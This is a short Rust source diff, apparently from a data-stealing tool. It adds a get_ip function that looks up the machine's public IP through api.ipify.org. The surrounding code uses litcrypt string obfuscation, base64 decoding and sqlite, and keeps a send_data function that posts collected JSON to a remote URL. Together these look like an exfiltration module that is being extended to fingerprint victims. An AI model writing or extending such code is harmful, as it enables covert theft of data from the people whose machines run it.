@@ -3,6 +3,7 @@ use base64::decode;
 use litcrypt::lc;
 use litcrypt::use_litcrypt;
 use reqwest;
+use serde::Deserialize;
 use serde_json::from_str;
 use serde_json::json;
 use sqlite;
@@ -114,4 +115,20 @@ pub fn send_data(data: serde_json::Value, url: String) -> Result<i32, ()> {
     let url: reqwest::Url = url.parse().unwrap();
     client.post(url).json(&data).send().unwrap();
     Ok(0)
+}
+
+#[derive(Deserialize)]
+struct Ip {
+    ip: String,
+}
+
+pub fn get_ip() -> String {
+    let url = "https://api.ipify.org?format=json";
+    if let Ok(resp) = reqwest::blocking::get(url) {
+        match resp.json::<Ip>() {
+            Ok(ip_obj) => return ip_obj.ip,
+            Err(_) => {}
+        }
+    }
+    "0.0.0.0".to_string()
 }
